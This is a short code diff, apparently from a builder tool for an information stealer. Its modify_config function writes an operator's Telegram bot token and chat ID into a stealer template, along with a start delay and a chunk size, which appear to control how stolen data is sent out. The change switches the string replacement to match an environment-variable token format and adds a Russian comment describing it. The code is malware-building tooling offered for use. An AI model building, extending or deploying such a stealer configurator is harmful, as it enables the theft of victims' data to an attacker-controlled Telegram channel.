@@ -22,8 +22,9 @@ def read_stealer_base():
 
 def modify_config(code, config):
     try:
-        code = code.replace('TG_BOT_TOKEN = "YOUR_BOT_TOKEN"', f'TG_BOT_TOKEN = "{config["token"]}"')
-        code = code.replace('TG_CHAT_ID = "YOUR_CHAT_ID"', f'TG_CHAT_ID = "{config["chat_id"]}"')
+        # Заменяем токены в формате: self.TG_BOT_TOKEN = os.environ.get('TG_BOT_TOKEN', 'YOUR_BOT_TOKEN')
+        code = code.replace("'YOUR_BOT_TOKEN'", f"'{config['token']}'")
+        code = code.replace("'YOUR_CHAT_ID'", f"'{config['chat_id']}'")
         code = code.replace('self.SLEEP_BEFORE_START = random.randint(5, 30)', f'self.SLEEP_BEFORE_START = {config["sleep_time"]}')
         code = code.replace('self.CHUNK_SIZE = 1024 * 1024', f'self.CHUNK_SIZE = {config["chunk_size"]}')
         
